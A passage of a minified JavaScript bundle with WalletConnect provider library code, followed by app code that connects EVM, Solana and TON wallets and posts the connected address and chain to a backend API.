this.namespace.defaultChain;const e=this.namespace.chains[0];if(!e)throw new Error("ChainId not found");return e.split(":")[1]}getAccounts(){const e=this.namespace.accounts;return e?[...new Set(e.filter(n=>n.split(":")[1]===this.chainId.toString()).map(n=>n.split(":")[2]))]:[]}createHttpProviders(){var e,n;const r={};return(n=(e=this.namespace)==null?void 0:e.accounts)==null||n.forEach(i=>{const o=FI(i);r[`${o.namespace}:${o.reference}`]=this.createHttpProvider(i)}),r}getHttpProvider(e){const n=this.httpProviders[e];if(typeof n>"u")throw new Error(`JSON-RPC provider for ${e} not found`);return n}setHttpProvider(e,n){const r=this.createHttpProvider(e,n);r&&(this.httpProviders[e]=r)}createHttpProvider(e,n){const r=n||nr(e,this.namespace,this.client.core.projectId);if(!r)throw new Error(`No RPC url provided for chainId: ${e}`);return new gr(new Br(r,Ge("disableProviderPing")))}}var RH=Object.defineProperty,DH=Object.defineProperties,NH=Object.getOwnPropertyDescriptors,yx=Object.getOwnPropertySymbols,kH=Object.prototype.hasOwnProperty,BH=Object.prototype.propertyIsEnumerable,mm=(t,e,n)=>e in t?RH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,Nh=(t,e)=>{for(var n in e||(e={}))kH.call(e,n)&&mm(t,n,e[n]);if(yx)for(var n of yx(e))BH.call(e,n)&&mm(t,n,e[n]);return t},ay=(t,e)=>DH(t,NH(e)),hr=(t,e,n)=>mm(t,typeof e!="symbol"?e+"":e,n);class ww{constructor(e){hr(this,"client"),hr(this,"namespaces"),hr(this,"optionalNamespaces"),hr(this,"sessionProperties"),hr(this,"scopedProperties"),hr(this,"events",new Mm),hr(this,"rpcProviders",{}),hr(this,"session"),hr(this,"providerOpts"),hr(this,"logger"),hr(this,"uri"),hr(this,"disableProviderPing",!1),this.providerOpts=e,this.logger=typeof(e==null?void 0:e.logger)<"u"&&typeof(e==null?void 0:e.logger)!="string"?e.logger:Uc(Af({level:(e==null?void 0:e.logger)||ix})),this.disableProviderPing=(e==null?void 0:e.disableProviderPing)||!1}static async init(e){const n=new ww(e);return await n.initialize(),n}async request(e,n,r){const[i,o]=this.validateChain(n);if(!this.session)throw new Error("Please call connect() before request()");return await this.getProvider(i).request({request:Nh({},e),chainId:`${i}:${o}`,topic:this.session.topic,expiry:r})}sendAsync(e,n,r,i){const o=new Date().getTime();this.request(e,r,i).then(l=>n(null,Lf(o,l))).catch(l=>n(l,void 0))}async enable(){if(!this.client)throw new Error("Sign Client not initialized");return this.session||await this.connect({namespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties}),await this.requestAccounts()}async disconnect(){var e;if(!this.session)throw new Error("Please call connect() before enable()");await this.client.disconnect({topic:(e=this.session)==null?void 0:e.topic,reason:G2("USER_DISCONNECTED")}),await this.cleanup()}async connect(e){if(!this.client)throw new Error("Sign Client not initialized");if(this.setNamespaces(e),await this.cleanupPendingPairings(),!e.skipPairing)return await this.pair(e.pairingTopic)}async authenticate(e,n){if(!this.client)throw new Error("Sign Client not initialized");this.setNamespaces(e),await this.cleanupPendingPairings();const{uri:r,response:i}=await this.client.authenticate(e,n);r&&(this.uri=r,this.events.emit("display_uri",r));const o=await i();if(this.session=o.session,this.session){const l=fx(this.session.namespaces);this.namespaces=iy(this.namespaces,l),await this.persist("namespaces",this.namespaces),this.onConnect()}return o}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}removeListener(e,n){this.events.removeListener(e,n)}off(e,n){this.events.off(e,n)}get isWalletConnect(){return!0}async pair(e){const{uri:n,approval:r}=await this.client.connect({pairingTopic:e,requiredNamespaces:this.namespaces,optionalNamespaces:this.optionalNamespaces,sessionProperties:this.sessionProperties,scopedProperties:this.scopedProperties});n&&(this.uri=n,this.events.emit("display_uri",n));const i=await r();this.session=i;const o=fx(i.namespaces);return this.namespaces=iy(this.namespaces,o),await this.persist("namespaces",this.namespaces),await this.persist("optionalNamespaces",this.optionalNamespaces),this.onConnect(),this.session}setDefaultChain(e,n){try{if(!this.session)return;const[r,i]=this.validateChain(e),o=this.getProvider(r);o.name===ga?o.setDefaultChain(`${r}:${i}`,n):o.setDefaultChain(i,n)}catch(r){if(!/Please call connect/.test(r.message))throw r}}async cleanupPendingPairings(e={}){this.logger.info("Cleaning up inactive pairings...");const n=this.client.pairing.getAll();if(ry(n)){for(const r of n)e.deletePairings?this.client.core.expirer.set(r.topic,0):await this.client.core.relayer.subscriber.unsubscribe(r.topic);this.logger.info(`Inactive pairings cleared: ${n.length}`)}}abortPairingAttempt(){this.logger.warn("abortPairingAttempt is deprecated. This is now a no-op.")}async checkStorage(){this.namespaces=await this.getFromStore("namespaces")||{},this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.session&&this.createProviders()}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){var e,n;if(this.client=this.providerOpts.client||await u7.init({core:this.providerOpts.core,logger:this.providerOpts.logger||ix,relayUrl:this.providerOpts.relayUrl||fq,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name,customStoragePrefix:this.providerOpts.customStoragePrefix,telemetryEnabled:this.providerOpts.telemetryEnabled}),this.providerOpts.session)try{this.session=this.client.session.get(this.providerOpts.session.topic)}catch(r){throw this.logger.error("Failed to get session",r),new Error(`The provided session: ${(n=(e=this.providerOpts)==null?void 0:e.session)==null?void 0:n.topic} doesn't exist in the Sign client`)}else{const r=this.client.session.getAll();this.session=r[0]}this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map(n=>hc(n)))];oy("client",this.client),oy("events",this.events),oy("disableProviderPing",this.disableProviderPing),e.forEach(n=>{if(!this.session)return;const r=Yq(n,this.session),i=mO(r),o=iy(this.namespaces,this.optionalNamespaces),l=ay(Nh({},o[n]),{accounts:r,chains:i});switch(n){case"eip155":this.rpcProviders[n]=new iH({namespace:l});break;case"algorand":this.rpcProviders[n]=new dH({namespace:l});break;case"solana":this.rpcProviders[n]=new aH({namespace:l});break;case"cosmos":this.rpcProviders[n]=new uH({namespace:l});break;case"polkadot":this.rpcProviders[n]=new Qq({namespace:l});break;case"cip34":this.rpcProviders[n]=new yH({namespace:l});break;case"elrond":this.rpcProviders[n]=new vH({namespace:l});break;case"multiversx":this.rpcProviders[n]=new xH({namespace:l});break;case"near":this.rpcProviders[n]=new IH({namespace:l});break;case"tezos":this.rpcProviders[n]=new PH({namespace:l});break;default:this.rpcProviders[ga]?this.rpcProviders[ga].updateNamespace(l):this.rpcProviders[ga]=new CH({namespace:l})}})}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",e=>{var n;const{topic:r}=e;r===((n=this.session)==null?void 0:n.topic)&&this.events.emit("session_ping",e)}),this.client.on("session_event",e=>{var n;const{params:r,topic:i}=e;if(i!==((n=this.session)==null?void 0:n.topic))return;const{event:o}=r;if(o.name==="accountsChanged"){const l=o.data;l&&ry(l)&&this.events.emit("accountsChanged",l.map(hx))}else if(o.name==="chainChanged"){const l=r.chainId,c=r.event.data,u=hc(l),f=sy(l)!==sy(c)?`${u}:${sy(c)}`:l;this.onChainChanged(f)}else this.events.emit(o.name,o.data);this.events.emit("session_event",e)}),this.client.on("session_update",({topic:e,params:n})=>{var r,i;if(e!==((r=this.session)==null?void 0:r.topic))return;const{namespaces:o}=n,l=(i=this.client)==null?void 0:i.session.get(e);this.session=ay(Nh({},l),{namespaces:o}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:n})}),this.client.on("session_delete",async e=>{var n;e.topic===((n=this.session)==null?void 0:n.topic)&&(await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",ay(Nh({},G2("USER_DISCONNECTED")),{data:e.topic})))}),this.on(yr.DEFAULT_CHAIN_CHANGED,e=>{this.onChainChanged(e,!0)})}getProvider(e){return this.rpcProviders[e]||this.rpcProviders[ga]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach(e=>{var n;this.getProvider(e).updateNamespace((n=this.session)==null?void 0:n.namespaces[e])})}setNamespaces(e){const{namespaces:n,optionalNamespaces:r,sessionProperties:i,scopedProperties:o}=e;n&&Object.keys(n).length&&(this.namespaces=n),r&&Object.keys(r).length&&(this.optionalNamespaces=r),this.sessionProperties=i,this.scopedProperties=o}validateChain(e){const[n,r]=(e==null?void 0:e.split(":"))||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[n,r];if(n&&!Object.keys(this.namespaces||{}).map(l=>hc(l)).includes(n))throw new Error(`Namespace '${n}' is not configured. Please call connect() first with namespace config.`);if(n&&r)return[n,r];const i=hc(Object.keys(this.namespaces)[0]),o=this.rpcProviders[i].getDefaultChain();return[i,o]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}async onChainChanged(e,n=!1){if(!this.namespaces)return;const[r,i]=this.validateChain(e);if(!i)return;this.updateNamespaceChain(r,i),this.events.emit("chainChanged",i);const o=this.getProvider(r).getDefaultChain();n||this.getProvider(r).setDefaultChain(i),this.emitAccountsChangedOnChainChange({namespace:r,previousChainId:o,newChainId:e}),await this.persist("namespaces",this.namespaces)}emitAccountsChangedOnChainChange({namespace:e,previousChainId:n,newChainId:r}){var i,o;try{if(n===r)return;const l=(o=(i=this.session)==null?void 0:i.namespaces[e])==null?void 0:o.accounts;if(!l)return;const c=l.filter(u=>u.includes(`${r}:`)).map(hx);if(!ry(c))return;this.events.emit("accountsChanged",c)}catch(l){this.logger.warn("Failed to emit accountsChanged on chain change",l)}}updateNamespaceChain(e,n){if(!this.namespaces)return;const r=this.namespaces[e]?e:`${e}:${n}`,i={chains:[],methods:[],events:[],defaultChain:n};this.namespaces[r]?this.namespaces[r]&&(this.namespaces[r].defaultChain=n):this.namespaces[r]=i}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async cleanup(){this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,await this.deleteFromStore("namespaces"),await this.deleteFromStore("optionalNamespaces"),await this.deleteFromStore("sessionProperties"),this.session=void 0,await this.cleanupPendingPairings({deletePairings:!0}),await this.cleanupStorage()}async persist(e,n){var r;const i=((r=this.session)==null?void 0:r.topic)||"";await this.client.core.storage.setItem(`${Rh}/${e}${i}`,n)}async getFromStore(e){var n;const r=((n=this.session)==null?void 0:n.topic)||"";return await this.client.core.storage.getItem(`${Rh}/${e}${r}`)}async deleteFromStore(e){var n;const r=((n=this.session)==null?void 0:n.topic)||"";await this.client.core.storage.removeItem(`${Rh}/${e}${r}`)}async cleanupStorage(){var e;try{if(((e=this.client)==null?void 0:e.session.length)>0)return;const n=await this.client.core.storage.getKeys();for(const r of n)r.startsWith(Rh)&&await this.client.core.storage.removeItem(r)}catch(n){this.logger.warn("Failed to cleanup storage",n)}}}const LH=ww,jH="wc",UH="ethereum_provider",MH=`${jH}@2:${UH}:`,FH="https://rpc.walletconnect.org/v1/",wm=["eth_sendTransaction","personal_sign"],zH=["eth_accounts","eth_requestAccounts","eth_sendRawTransaction","eth_sign","eth_signTransaction","eth_signTypedData","eth_signTypedData_v3","eth_signTypedData_v4","eth_sendTransaction","personal_sign","wallet_switchEthereumChain","wallet_addEthereumChain","wallet_getPermissions","wallet_requestPermissions","wallet_registerOnboarding","wallet_watchAsset","wallet_scanQRCode","wallet_sendCalls","wallet_getCapabilities","wallet_getCallsStatus","wallet_showCallsStatus"],vm=["chainChanged","accountsChanged"],qH=["chainChanged","accountsChanged","message","disconnect","connect"],HH=async()=>{const{createAppKit:t}=await xa(()=>import("./core-D-TsmA5l.js").then(e=>e.V),[]);return t};var VH=Object.defineProperty,WH=Object.defineProperties,KH=Object.getOwnPropertyDescriptors,mx=Object.getOwnPropertySymbols,GH=Object.prototype.hasOwnProperty,YH=Object.prototype.propertyIsEnumerable,bm=(t,e,n)=>e in t?VH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,zs=(t,e)=>{for(var n in e||(e={}))GH.call(e,n)&&bm(t,n,e[n]);if(mx)for(var n of mx(e))YH.call(e,n)&&bm(t,n,e[n]);return t},oc=(t,e)=>WH(t,KH(e)),Kn=(t,e,n)=>bm(t,typeof e!="symbol"?e+"":e,n);function ff(t){return Number(t[0].split(":")[1])}function kh(t){return`0x${t.toString(16)}`}function JH(t){const{chains:e,optionalChains:n,methods:r,optionalMethods:i,events:o,optionalEvents:l,rpcMap:c}=t;if(!Cy(e))throw new Error("Invalid chains");const u={chains:e,methods:r||wm,events:o||vm,rpcMap:zs({},e.length?{[ff(e)]:c[ff(e)]}:{})},f=o==null?void 0:o.filter(E=>!vm.includes(E)),d=r==null?void 0:r.filter(E=>!wm.includes(E));if(!n&&!l&&!i&&!(f!=null&&f.length)&&!(d!=null&&d.length))return{required:e.length?u:void 0};const y=(f==null?void 0:f.length)&&(d==null?void 0:d.length)||!n,g={chains:[...new Set(y?u.chains.concat(n||[]):n)],methods:[...new Set(u.methods.concat(i!=null&&i.length?i:zH))],events:[...new Set(u.events.concat(l!=null&&l.length?l:qH))],rpcMap:c};return{required:e.length?u:void 0,optional:n.length?g:void 0}}class vw{constructor(){Kn(this,"events",new rr.EventEmitter),Kn(this,"namespace","eip155"),Kn(this,"accounts",[]),Kn(this,"signer"),Kn(this,"chainId",1),Kn(this,"modal"),Kn(this,"rpc"),Kn(this,"STORAGE_KEY",MH),Kn(this,"on",(e,n)=>(this.events.on(e,n),this)),Kn(this,"once",(e,n)=>(this.events.once(e,n),this)),Kn(this,"removeListener",(e,n)=>(this.events.removeListener(e,n),this)),Kn(this,"off",(e,n)=>(this.events.off(e,n),this)),Kn(this,"parseAccount",e=>this.isCompatibleChainId(e)?this.parseAccountId(e).address:e),this.signer={},this.rpc={}}static async init(e){const n=new vw;return await n.initialize(e),n}async request(e,n){return await this.signer.request(e,this.formatChainId(this.chainId),n)}sendAsync(e,n,r){this.signer.sendAsync(e,n,this.formatChainId(this.chainId),r)}get connected(){return this.signer.client?this.signer.client.core.relayer.connected:!1}get connecting(){return this.signer.client?this.signer.client.core.relayer.connecting:!1}async enable(){return this.session||await this.connect(),await this.request({method:"eth_requestAccounts"})}async connect(e){var n;if(!this.signer.client)throw new Error("Provider not initialized. Call init() first");this.loadConnectOpts(e);const{required:r,optional:i}=JH(this.rpc);try{const o=await new Promise(async(c,u)=>{var f,d;this.rpc.showQrModal&&((f=this.modal)==null||f.open(),(d=this.modal)==null||d.subscribeState(g=>{!g.open&&!this.signer.session&&(this.signer.abortPairingAttempt(),u(new Error("Connection request reset. Please try again.")))}));const y=e!=null&&e.scopedProperties?{[this.namespace]:e.scopedProperties}:void 0;await this.signer.connect(oc(zs({namespaces:zs({},r&&{[this.namespace]:r})},i&&{optionalNamespaces:{[this.namespace]:i}}),{pairingTopic:e==null?void 0:e.pairingTopic,scopedProperties:y})).then(g=>{c(g)}).catch(g=>{var E;(E=this.modal)==null||E.showErrorMessage("Unable to connect"),u(new Error(g.message))})});if(!o)return;const l=ub(o.namespaces,[this.namespace]);this.setChainIds(this.rpc.chains.length?this.rpc.chains:l),this.setAccounts(l),this.events.emit("connect",{chainId:kh(this.chainId)})}catch(o){throw this.signer.logger.error(o),o}finally{(n=this.modal)==null||n.close()}}async authenticate(e,n){var r;if(!this.signer.client)throw new Error("Provider not initialized. Call init() first");this.loadConnectOpts({chains:e==null?void 0:e.chains});try{const i=await new Promise(async(l,c)=>{var u,f;this.rpc.showQrModal&&((u=this.modal)==null||u.open(),(f=this.modal)==null||f.subscribeState(d=>{!d.open&&!this.signer.session&&(this.signer.abortPairingAttempt(),c(new Error("Connection request reset. Please try again.")))})),await this.signer.authenticate(oc(zs({},e),{chains:this.rpc.chains}),n).then(d=>{l(d)}).catch(d=>{var y;(y=this.modal)==null||y.showErrorMessage("Unable to connect"),c(new Error(d.message))})}),o=i.session;if(o){const l=ub(o.namespaces,[this.namespace]);this.setChainIds(this.rpc.chains.length?this.rpc.chains:l),this.setAccounts(l),this.events.emit("connect",{chainId:kh(this.chainId)})}return i}catch(i){throw this.signer.logger.error(i),i}finally{(r=this.modal)==null||r.close()}}async disconnect(){this.session&&await this.signer.disconnect(),this.reset()}get isWalletConnect(){return!0}get session(){return this.signer.session}registerEventListeners(){this.signer.on("session_event",e=>{const{params:n}=e,{event:r}=n;r.name==="accountsChanged"?(this.accounts=this.parseAccounts(r.data),this.events.emit("accountsChanged",this.accounts)):r.name==="chainChanged"?this.setChainId(this.formatChainId(r.data)):this.events.emit(r.name,r.data),this.events.emit("session_event",e)}),this.signer.on("accountsChanged",e=>{this.accounts=this.parseAccounts(e),this.events.emit("accountsChanged",this.accounts)}),this.signer.on("chainChanged",e=>{const n=parseInt(e);this.chainId=n,this.events.emit("chainChanged",kh(this.chainId)),this.persist()}),this.signer.on("session_update",e=>{this.events.emit("session_update",e)}),this.signer.on("session_delete",e=>{this.reset(),this.events.emit("session_delete",e),this.events.emit("disconnect",oc(zs({},uk("USER_DISCONNECTED")),{data:e.topic,name:"USER_DISCONNECTED"}))}),this.signer.on("display_uri",e=>{this.events.emit("display_uri",e)})}switchEthereumChain(e){this.request({method:"wallet_switchEthereumChain",params:[{chainId:e.toString(16)}]})}isCompatibleChainId(e){return typeof e=="string"?e.startsWith(`${this.namespace}:`):!1}formatChainId(e){return`${this.namespace}:${e}`}parseChainId(e){return Number(e.split(":")[1])}setChainIds(e){const n=e.filter(r=>this.isCompatibleChainId(r)).map(r=>this.parseChainId(r));n.length&&(this.chainId=n[0],this.events.emit("chainChanged",kh(this.chainId)),this.persist())}setChainId(e){if(this.isCompatibleChainId(e)){const n=this.parseChainId(e);this.chainId=n,this.switchEthereumChain(n)}}parseAccountId(e){const[n,r,i]=e.split(":");return{chainId:`${n}:${r}`,address:i}}setAccounts(e){this.accounts=e.filter(n=>this.parseChainId(this.parseAccountId(n).chainId)===this.chainId).map(n=>this.parseAccountId(n).address),this.events.emit("accountsChanged",this.accounts)}getRpcConfig(e){var n,r;const i=(n=e==null?void 0:e.chains)!=null?n:[],o=(r=e==null?void 0:e.optionalChains)!=null?r:[],l=i.concat(o);if(!l.length)throw new Error("No chains specified in either `chains` or `optionalChains`");const c=i.length?(e==null?void 0:e.methods)||wm:[],u=i.length?(e==null?void 0:e.events)||vm:[],f=(e==null?void 0:e.optionalMethods)||[],d=(e==null?void 0:e.optionalEvents)||[],y=(e==null?void 0:e.rpcMap)||this.buildRpcMap(l,e.projectId),g=(e==null?void 0:e.qrModalOptions)||void 0;return{chains:i==null?void 0:i.map(E=>this.formatChainId(E)),optionalChains:o.map(E=>this.formatChainId(E)),methods:c,events:u,optionalMethods:f,optionalEvents:d,rpcMap:y,showQrModal:!!(e!=null&&e.showQrModal),qrModalOptions:g,projectId:e.projectId,metadata:e.metadata}}buildRpcMap(e,n){const r={};return e.forEach(i=>{r[i]=this.getRpcUrl(i,n)}),r}async initialize(e){if(this.rpc=this.getRpcConfig(e),this.chainId=this.rpc.chains.length?ff(this.rpc.chains):ff(this.rpc.optionalChains),this.signer=await LH.init({projectId:this.rpc.projectId,metadata:this.rpc.metadata,disableProviderPing:e.disableProviderPing,relayUrl:e.relayUrl,storage:e.storage,storageOptions:e.storageOptions,customStoragePrefix:e.customStoragePrefix,telemetryEnabled:e.telemetryEnabled,logger:e.logger}),this.registerEventListeners(),await this.loadPersistedSession(),this.rpc.showQrModal){let n;try{const r=await HH(),{convertWCMToAppKitOptions:i}=await Promise.resolve().then(function(){return oV}),o=i(oc(zs({},this.rpc.qrModalOptions),{chains:[...new Set([...this.rpc.chains,...this.rpc.optionalChains])],metadata:this.rpc.metadata,projectId:this.rpc.projectId}));if(!o.networks.length)throw new Error("No networks found for WalletConnect·");n=r(oc(zs({},o),{universalProvider:this.signer,manualWCControl:!0}))}catch(r){throw console.warn(r),new Error("To use QR modal, please install @reown/appkit package")}if(n)try{this.modal=n}catch(r){throw this.signer.logger.error(r),new Error("Could not generate WalletConnectModal Instance")}}}loadConnectOpts(e){if(!e)return;const{chains:n,optionalChains:r,rpcMap:i}=e;n&&Cy(n)&&(this.rpc.chains=n.map(o=>this.formatChainId(o)),n.forEach(o=>{this.rpc.rpcMap[o]=(i==null?void 0:i[o])||this.getRpcUrl(o)})),r&&Cy(r)&&(this.rpc.optionalChains=[],this.rpc.optionalChains=r==null?void 0:r.map(o=>this.formatChainId(o)),r.forEach(o=>{this.rpc.rpcMap[o]=(i==null?void 0:i[o])||this.getRpcUrl(o)}))}getRpcUrl(e,n){var r;return((r=this.rpc.rpcMap)==null?void 0:r[e])||`${FH}?chainId=eip155:${e}&projectId=${n||this.rpc.projectId}`}async loadPersistedSession(){if(this.session)try{const e=await this.signer.client.core.storage.getItem(`${this.STORAGE_KEY}/chainId`),n=this.session.namespaces[`${this.namespace}:${e}`]?this.session.namespaces[`${this.namespace}:${e}`]:this.session.namespaces[this.namespace];this.setChainIds(e?[this.formatChainId(e)]:n==null?void 0:n.accounts),this.setAccounts(n==null?void 0:n.accounts)}catch(e){this.signer.logger.error("Failed to load persisted session, clearing state..."),this.signer.logger.error(e),await this.disconnect().catch(n=>this.signer.logger.warn(n))}}reset(){this.chainId=1,this.accounts=[]}persist(){this.session&&this.signer.client.core.storage.setItem(`${this.STORAGE_KEY}/chainId`,this.chainId)}parseAccounts(e){return typeof e=="string"||e instanceof String?[this.parseAccount(e)]:e.map(n=>this.parseAccount(n))}}var ZH=Object.defineProperty,QH=Object.defineProperties,XH=Object.getOwnPropertyDescriptors,wx=Object.getOwnPropertySymbols,eV=Object.prototype.hasOwnProperty,tV=Object.prototype.propertyIsEnumerable,vx=(t,e,n)=>e in t?ZH(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,vO=(t,e)=>{for(var n in e||(e={}))eV.call(e,n)&&vx(t,n,e[n]);if(wx)for(var n of wx(e))tV.call(e,n)&&vx(t,n,e[n]);return t},nV=(t,e)=>QH(t,XH(e));function rV(t){if(t)return{"--w3m-font-family":t["--wcm-font-family"],"--w3m-accent":t["--wcm-accent-color"],"--w3m-color-mix":t["--wcm-background-color"],"--w3m-z-index":t["--wcm-z-index"]?Number(t["--wcm-z-index"]):void 0,"--w3m-qr-color":t["--wcm-accent-color"],"--w3m-font-size-master":t["--wcm-text-medium-regular-size"],"--w3m-border-radius-master":t["--wcm-container-border-radius"],"--w3m-color-mix-strength":0}}const iV=t=>{const[e,n]=t.split(":");return bO({id:n,caipNetworkId:t,chainNamespace:e,name:"",nativeCurrency:{name:"",symbol:"",decimals:8},rpcUrls:{default:{http:["https://rpc.walletconnect.org/v1"]}}})};function sV(t){var e,n,r,i,o,l,c;const u=(e=t.chains)==null?void 0:e.map(iV).filter(Boolean);if(u.length===0)throw new Error("At least one chain must be specified");const f=u.find(y=>{var g;return y.id===((g=t.defaultChain)==null?void 0:g.id)}),d={projectId:t.projectId,networks:u,themeMode:t.themeMode,themeVariables:rV(t.themeVariables),chainImages:t.chainImages,connectorImages:t.walletImages,defaultNetwork:f,metadata:nV(vO({},t.metadata),{name:((n=t.metadata)==null?void 0:n.name)||"WalletConnect",description:((r=t.metadata)==null?void 0:r.description)||"Connect to WalletConnect-compatible wallets",url:((i=t.metadata)==null?void 0:i.url)||"https://walletconnect.org",icons:((o=t.metadata)==null?void 0:o.icons)||["https://walletconnect.org/walletconnect-logo.png"]}),showWallets:!0,featuredWalletIds:t.explorerRecommendedWalletIds==="NONE"?[]:Array.isArray(t.explorerRecommendedWalletIds)?t.explorerRecommendedWalletIds:[],excludeWalletIds:t.explorerExcludedWalletIds==="ALL"?[]:Array.isArray(t.explorerExcludedWalletIds)?t.explorerExcludedWalletIds:[],enableEIP6963:!1,enableInjected:!1,enableCoinbase:!0,enableWalletConnect:!0,features:{email:!1,socials:!1}};if((l=t.mobileWallets)!=null&&l.length||(c=t.desktopWallets)!=null&&c.length){const y=[...(t.mobileWallets||[]).map(w=>({id:w.id,name:w.name,links:w.links})),...(t.desktopWallets||[]).map(w=>({id:w.id,name:w.name,links:{native:w.links.native,universal:w.links.universal}}))],g=[...d.featuredWalletIds||[],...d.excludeWalletIds||[]],E=y.filter(w=>!g.includes(w.id));E.length&&(d.customWallets=E)}return d}function bO(t){return vO({formatters:void 0,fees:void 0,serializers:void 0},t)}var oV=Object.freeze({__proto__:null,convertWCMToAppKitOptions:sV,defineChain:bO});const aV="https://crypto-api-hsdj.onrender.com",lV=async(t,e)=>{try{t({type:"SET_ERROR",payload:null});let n=null;if(["ethereum","polygon","bsc","arbitrum","optimism","fantom","avalanche","base"].includes(e)){const o={ethereum:1,polygon:137,bsc:56,arbitrum:42161,optimism:10,fantom:250,avalanche:43114,base:8453}[e],l=/Android|iPhone|iPad/i.test(navigator.userAgent);window.evmProvider||(window.evmProvider=await vw.init({projectId:"edc965db046d9ccd493ca31544001628",chains:[o],optionalChains:[],methods:["eth_sendTransaction","personal_sign","eth_signTypedData"],rpcMap:{1:"https://mainnet.infura.io/v3/edc965db046d9ccd493ca31544001628",137:"https://polygon-rpc.com",56:"https://bsc-dataseed.binance.org/",42161:"https://arb1.arbitrum.io/rpc",10:"https://mainnet.optimism.io",250:"https://rpc.fantom.network",43114:"https://api.avax.network/ext/bc/C/rpc",8453:"https://mainnet.base.org"},showQrModal:!l}),window.evmProvider.on("display_uri",y=>{if(l){const g=document.createElement("div");g.innerText="Opening your wallet... If not redirected, open Trust Wallet or MetaMask manually.",g.style.position="fixed",g.style.bottom="20px",g.style.left="50%",g.style.transform="translateX(-50%)",g.style.backgroundColor="#222",g.style.color="#fff",g.style.padding="10px 15px",g.style.borderRadius="8px",g.style.zIndex=9999,g.style.fontSize="14px",document.body.appendChild(g),setTimeout(()=>{g.remove();const E=`https://link.trustwallet.com/wc?uri=${encodeURIComponent(y)}`;window.location.href=E},2500)}}));const c=window.evmProvider;await c.enable();const u=await xa(()=>import("./index-C4E-Cb7J.js"),[]);n=await(await new u.BrowserProvider(c).getSigner()).getAddress()}else if(e==="solana"){const i=/Android|iPhone|iPad/i.test(navigator.userAgent),o=encodeURIComponent(window.location.href);if(i&&(!window.solana||!window.solana.isPhantom)){const c=document.createElement("div");c.innerText=`Tap 'Connect' inside Phantom's browser after opening.
If not redirected, open Phantom, go to Browser tab, and paste this URL: https://test-vite2.netlify.app/`,c.style.position="fixed",c.style.bottom="20px",c.style.left="50%",c.style.transform="translateX(-50%)",c.style.backgroundColor="#333",c.style.color="#fff",c.style.padding="12px 16px",c.style.borderRadius="8px",c.style.zIndex=9999,c.style.textAlign="center",c.style.maxWidth="90%",c.style.fontSize="14px",document.body.appendChild(c),setTimeout(()=>{c.remove(),window.location.href=`https://phantom.app/ul/dapp?app_url=${o}`},6e3);return}n=(await window.solana.connect()).publicKey.toString()}else if(e==="ton"){const{TonConnectUI:i}=await xa(async()=>{const{TonConnectUI:d}=await import("./index-B_Dx6GzK.js");return{TonConnectUI:d}},__vite__mapDeps([0,1])),{Address:o}=await xa(async()=>{const{Address:d}=await import("./index-CgjqaokM.js").then(y=>y.i);return{Address:d}},__vite__mapDeps([2,1])),c=await new i({manifestUrl:"https://test-vite2.netlify.app/tonconnect-manifest.json"}).connectWallet();if(!c||!c.account||!c.account.address){t({type:"SET_ERROR",payload:"TON wallet connection failed or was rejected"}),Bh("TON wallet connection failed or was rejected");return}const u=c.account.address;n=o.parse(u).toString({bounceable:!0,urlSafe:!0})}else{t({type:"SET_ERROR",payload:`Unsupported chain: ${e}`}),Bh(`Unsupported chain: ${e}`);return}t({type:"SET_ADDRESS",payload:n});const r=await fetch(`${aV}/api/wallets`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({address:n,chain:e})});if(!r.ok){const i=await r.text();console.error("Failed to save wallet:",i),Bh("fetch error")}}catch(n){console.error("connectWallet error:",n),t({type:"SET_ERROR",payload:n.message||"Wallet connection failed"}),Bh(n.message||"Wallet connection failed")}};function Bh(t){const e=document.createElement("div");e.innerText=t,e.style.position="fixed",e.style.bottom="20px",e.style.left="50%",e.style.transform="translateX(-50%)",e.style.backgroundColor="#d9534f",e.style.color="#fff",e.style.padding="12px 16px",e.style.borderRadius="8px",e.style.zIndex=9999,e.style.textAlign="center",e.style.maxWidth="90%",e.style.fontSize="14px",document.body.appendChild(e),setTimeout(()=>{e.remove()},8e3)}const cV=async(t,e)=>{var n;try{if(["ethereum","polygon","bsc","arbitrum","optimism","fantom","avalanche","base"].includes(e)&&window.evmProvider&&(await window.evmProvider.disconnect(),window.evmProvider=null),e==="solana"&&((n=window.solana)!=null&&n.isConnected)&&window.solana.disconnect(),e==="ton"){const{TonConnectUI:r}=await xa(async()=>{const{TonConnectUI:o}=await import("./index-B_Dx6GzK.js");return{TonConnectUI:o}},__vite__mapDeps([0,1]));await new r({manifestUrl:`${window.location.origin}/tonconnect-manifest.json`}).disconnect()}t({type:"DISCONNECT"})}catch(r){console.error("Disconnect error:",r),t({type:"SET_ERROR",payload:"Failed to disconnect 